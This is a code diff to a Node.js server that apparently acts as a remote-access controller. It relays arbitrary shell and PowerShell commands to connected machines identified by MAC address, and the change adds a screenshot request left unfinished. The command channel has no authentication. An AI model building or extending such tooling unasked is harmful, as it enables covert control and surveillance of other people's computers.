@@ -4,26 +4,45 @@ const url = require('url');
 const fs = require("fs");
 
 class Client {
-    constructor(socket, os, onCommandChange) {
+    constructor(socket, os, doRequest) {
         this.ip = socket.remoteAddress;
         this.port = socket.remotePort;
         this.os = os;
-        this.onCommandChange = onCommandChange;
+        this.doRequest = doRequest;
+        this.onCompletedArray = [];
+        this.currentID = 0;
     }
 
-    setCommand(command, onComplete, isPSL = false) {
-        this._command = command;
-        this.onComplete = result => {
-            onComplete(result);
-            this.onComplete = null;
-        };
-        if (typeof this.onCommandChange === "function") {
-            this.onCommandChange(command, isPSL);
+    onRequestCompleted(result) {
+        for (let i = 0; i < this.onCompletedArray.length; i++) {
+            if (this.onCompletedArray[i](result)) {
+                this.onCompletedArray.splice(i, 1);
+            }
         }
     }
 
-    getCommand() {
-        return this._command;
+    request(type, data, onComplete) {
+        let id = this.currentID++;
+        this.onCompletedArray.push(function(result) {
+            if (result['id'] == id) {
+                onComplete(result);
+                return true;
+            }
+            return false;
+        });
+        data['type'] = type;
+        this.doRequest(data);
+    }
+
+    setCommand(command, onComplete, isPSL = false) {
+        isPSL = !!isPSL;
+        this.request(isPSL ? "psl" : "command", {
+            command: command
+        }, onComplete);
+    }
+
+    takeScreenshot(onComplete) {
+        this.request("screenshot", {}, onComplete);
     }
 }
 
@@ -45,23 +64,12 @@ const socketServer = net.createServer(socket => {
             if (obj['type'] === 'init') {
                 mac = obj['mac'];
                 os = obj['os'];
-                client = clients[mac] = new Client(socket, os, (command, isPSL) => {
-                    if (!isPSL) socket.write(encodeURI(JSON.stringify({
-                        type: "command",
-                        command: command,
-                    })) + "\n"); else {
-                        let str = encodeURI(JSON.stringify({
-                            type: "psl",
-                            command: command,
-                        })) + "\n";
-                        socket.write(str)
-                    }
+                client = clients[mac] = new Client(socket, os, (data) => {
+                    socket.write(encodeURI(JSON.stringify(data)) + "\n");
                 });
                 console.log("Client " + mac + " connected!\nOS: " + os + "\nIP address: " + client.ip + ":" + client.port + "\n");
             } else if (obj['type'] === "result") {
-                if (typeof client.onComplete === "function") {
-                    client.onComplete(obj['result']);
-                }
+                client.onRequestCompleted(obj);
             }
         }
     });
@@ -82,12 +90,18 @@ const httpServer = http.createServer((req, res) => {
     let query = url.parse(req.url, true).query;
     if (query != null) {
         if (typeof query['mac'] !== "undefined") {
-            res.writeHead(200, {'Content-Type': 'text/plain'});
             if (clients[query['mac']] !== undefined) {
                 if (typeof query['command'] !== "undefined") {
+                    res.writeHead(200, {'Content-Type': 'text/plain'});
                     clients[query['mac']].setCommand(query['command'], result => res.end(result));
                 } else if (typeof query['psl'] !== "undefined") {
+                    res.writeHead(200, {'Content-Type': 'text/plain'});
                     clients[query['mac']].setCommand(query['psl'], result => res.end(result), true);
+                } else if (typeof query['screenshot'] !== "undefined") {
+                    res.writeHead(200, {'Content-Type': 'image/png'});
+                    clients[query['mac']].takeScreenshot(result => {
+
+                    });
                 } else {
                     res.end("Unknown operation");
                 }
